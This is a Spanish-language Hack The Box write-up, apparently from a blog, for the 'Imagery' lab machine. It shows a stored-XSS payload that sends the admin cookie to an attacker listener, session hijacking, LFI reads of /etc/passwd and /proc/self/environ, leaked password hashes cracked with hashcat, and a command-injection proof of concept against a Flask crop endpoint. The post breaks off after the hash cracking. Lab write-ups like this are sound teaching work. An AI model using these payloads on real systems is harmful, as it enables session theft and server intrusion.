---
layout: single
title: Imagery - Hack The Box
excerpt: "Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador."
date: 2026-02-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-imagery/logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
---

Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador.

# 1. Enumeracion

Con `nmap` buscaremos los puertos abiertos para escanear los servicios que le alojan en ellos.

```
nmap -p- -vvv --min-rate 5000 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:46 -05
Initiating Ping Scan at 14:46
Scanning 10.129.242.164 [2 ports]
Completed Ping Scan at 14:46, 0.32s elapsed (1 total hosts)
Initiating Connect Scan at 14:46
Scanning imagery.htb (10.129.242.164) [65535 ports]
Discovered open port 22/tcp on 10.129.242.164
Completed Connect Scan at 14:46, 26.62s elapsed (65535 total ports)
Nmap scan report for imagery.htb (10.129.242.164)
Host is up, received conn-refused (0.17s latency).
Scanned at 2026-02-19 14:46:05 -05 for 27s
Not shown: 65465 filtered tcp ports (no-response)
PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack
8000/tcp  open   http-alt         syn-ack ttl 63

nmap -p 22,8000 -sCV 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:53 -05
Nmap scan report for imagery.htb (10.129.242.164)
Host is up (0.17s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```

El browser busca la IP registrada en el archivo local `/etc/hosts` y si no la encuentra busca en el servidor DNS, para eso agregamos la IP de la maquina en este archivo. 

```
echo "10.129.243.164 imagery.htb" | sudo tee -a /etc/hosts
```

![](/assets/images/htb-writeup-imagery/home.png)

Despues de navegar por las diferentes rutas, nos registramos en `http://imagery.htb:8000/register` y e ingresamos `http://imagery.htb:8000/login`

# 2. Explotacion

## 2.1 Cross-Site Scripting (XSS)

Notamos que el formulario de tipo text area de la ruta `http://imagery.htb:8000/admin/bug_reports` es vulnerable a XSS el cual aprovecharemos para inyectar HTML y obtener la cookie del administrador. Una vez el admistrador atienda los reportes obtendremos su cookie de sesion.

Para eso desde nuentra maquina levantaremos en escucha un servidor en el puerto `8080`.

```
python -m http.server 8080
```
Enviaremos como parametro el siguiente HTML formulario Bug Details.

```html
<img src=/ onerror="document.location='http://{ip_atacante}:8080/'+document.cookie" />
```

Si obtenemos el fetch  que envia el navegador, el payload final quedaria asi: 

```js
await fetch("http://imagery.htb:8000/report_bug", {
    "credentials": "include",
    "headers": {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
    },
    "body": "{\"bugName\":\"test bug report\",\"bugDetails\":\"<img src=/ onerror=\\\"document.location='http://10.10.15.107:8080/'+document.cookie\\\">\"}",
    "method": "POST",
    "mode": "cors"
});
```
Cuando el administrador entre a ver el reporte, sera redirigido al host del atacante donde podra ver la su cookie de session.

```
python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aZeEnw.GC9hjlqO-RnfgqivZOtmhF_yJKE HTTP/1.1" 404 -
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /favicon.ico HTTP/1.1" 404 -
```

Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` deja a la aplicación expuesta a ataques de **Cross-Site Scripting (XSS)** y secuestro de sesión. 

En consecuencia podremos entrar como administradores y seguir entendiendo como funciona esta APP Web. 

### 2.1.1 Secuestro de sesion

Procedemos a ir al strogange del browser donde encontraremos el valor de la cookie de sesion de nuentro ususario, si remplazamos la cookie nuestra por el del administrador accederemos a su usuario y podemos ver sus funciones

![](/assets/images/htb-writeup-imagery/secuestroSesion.png)

Al navegar como administradores podemos ver que tiene accesos a eliminar usuarios, descargar logs, ver y eliminar los reportes de errores. 

Veamos una de las fetchs que envia el navegador:

```js
await fetch("http://imagery.htb:8000/admin/get_system_log?log_identifier=admin%40imagery.htb.log", {
    "credentials": "include",
    "headers": {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
    },
    "method": "GET",
    "mode": "cors"
});
```
## 2.2 Local File Inclusion (LFI)
Analicemos el **Path** `/get_system_log` este recurso accedido puede ser un file o un folder. Pero al ser una app web desarrollada con flask podemos intuir que es un metodo. Y su **Query scrign** envia el parametro `?log_identifier=admin%40imagery.htb.log` que podemos ver que es el nombre del log que intenta recuperar de la base de datos. 

En conlusion por medio de este metodo descarga un archivo. ¿Facil no?

Haremos **Web Fuzzing** al parametro `log_identifier` y veremos como se comporta la APP. Para eso podemos usar ZAP, Burpsuite, FFUF, Gobuster, entre otros. 

### 2.2.1 Web Fuzzing con Burp Suite
Usaremos Burb includer que es el web fuzzer de Burp. 

Configurado con: 
- **sniper attack** 
- **payload type**: Simple list 
- **wordlist**: [SecList/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

Encontramos que podemos descargar y ver los directorios estandares del sistema.

- `/etc`: El directorio de archivos de configuración del sistema local. Donde tambien se encontran los archivos de configuración para las aplicaciones instaladas.
  - /etc/passwd 
  - /etc/hosts
  - /etc/crontab
  - /etc/grup

  ![](/assets/images/htb-writeup-imagery/lfi-etc.png)

- `/proc`: Es un archivo "virtual" que solo existe en la memoria mientras el sistema corre. Donde muestra las variables de entorno del proceso que se está ejecutando actualmente.
  - /proc/self/environ

  ![](/assets/images/htb-writeup-imagery/lfi-proc.png)

Notamos que exite un grupo llamado `web:x:1001:` y una variable de entorno llamada `HOME=/home/web`.

### 2.2.2 Codigo fuente

La estructura de un proyecto en **Flask** puede variar desde un único archivo hasta una arquitectura modular compleja, dependiendo de la escala de la aplicación. Una basica constata de la siguiente:

```
mi_proyecto/
├── app.py              # Lógica principal, rutas y configuración
├── static/             # Archivos CSS, JS e imágenes
│   └── css/style.css
├── templates/          # Archivos HTML (Jinja2)
│   └── index.html
├── venv/               # Entorno virtual (muy recomendado)
└── requirements.txt    # Dependencias del proyecto
```

Procedemos a descargar por medio del path `/admin/get_system_log?log_identifier=/home/web/web/app.py` el codigo fuente principal de la APP Web y los archivos que la componen.

```
curl -s -O -b 'session={admin_cookie}'  http://imagery.htb:8000/admin/get_system_log?log_identifier=/home/web/web/app.py
```

```py
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False
```

Vemos los modulos y librerias que se importan:
- config.py
- utils.py
- api_auth.py
- api_upload.py
- api_manage.py
- api_edit.py
- api_admin.py
- api_misc.py

Vemos en el config.py algunas variables de configuracion.

```py
import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'
```

Vemos en el db.json las hashes de los usuarios: 

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ]
}
```
## 2.3 Remote Code Execution

Analicemos el metodo `apply_visual_transform()` de  `api_edit.py`

```py
@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        else:
            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Transformed: {original_image['title']}",
            'description': f"Transformed from {original_image['title']} ({transform_type}).",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Transformed',
            'type': 'transformed',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath)
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500

```

Notamos que este metodo tiene algunas validaciones de permisos y una de ellas es que solo esta dispobible para el usuario con la flag `isTestuser` que se encuentra marcada en la estructura json en el archivo `db.json` ¿lo recuerdan? y la relacion con el atributo `is_testuser_account` de la session se encuentra mapeada en el archivo `admin.py`. 

Como vemos en el codigo fuente, este metodo tiene varias acciones para transformar una imagen: 
- Recortar
- Girar / Rotar
- Saturacion
- Brillo
- Constraste

Analicemos la accion de recortar en el condicional.

```py
if transform_type == 'crop':
    x = str(params.get('x'))
    y = str(params.get('y'))
    width = str(params.get('width'))
    height = str(params.get('height'))
    command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
    subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```
El desarrollador en este punto utiliza **ImageMagick** que es una suite de linea de comandos para procesar imagenes, donde basicamente mediante datos de entrada del usuario pasara la intruccion a **ImageMagick** para recortar la imagen.

Al usar `shell=True`, Python no ejecuta el programa directamente. En su lugar abre una instancia de la terminal le envia la cadena de texto referenciada en la variable `command` y la terminal ejecuta el comando.

Si logramos romper la cadena haciendo que la concatenacion referenciada en la variable `command` solo tome el valor de uno de los parametros que envia el usuario, podemos inyectar un comando del sistema operativo y hacernos con el servidor web via `rever shell``. 

Ejemplo: mini PoC
```py
import subprocess

# Variables que no queremos que afecten
IMAGEMAGICK_CONVERT_PATH = "convert"
original_filepath = "imagen.jpg"
width, height, y = 100, 100, 0
output_filepath = "salida.jpg"

# El "inyector" en x:
# 1. El primer ';' termina el intento de 'convert'
# 2. 'ls -l' es lo que realmente se ejecutará
# 3. El '#' hace que '+{y} {output_filepath}' sea ignorado
x = "; ls -l #"

command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"

# IMPORTANTE: shell=True es obligatorio para que esto funcione
subprocess.run(command, shell=True)
```
En este script de python vemos que es posible romper la cadena y usar `x` como inyector.

### 2.3.1 Crackear hash

Obtendremos las credenciales del usuario **testuser@imagery.htb** crakeando el hash con **hashcat**

```
hashcat "2c65c8d7bfbca32a3ed42596192384f6" -m 0 -a 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --show

2c65c8d7bfbca32a3ed42596192384f6:iambatman
``````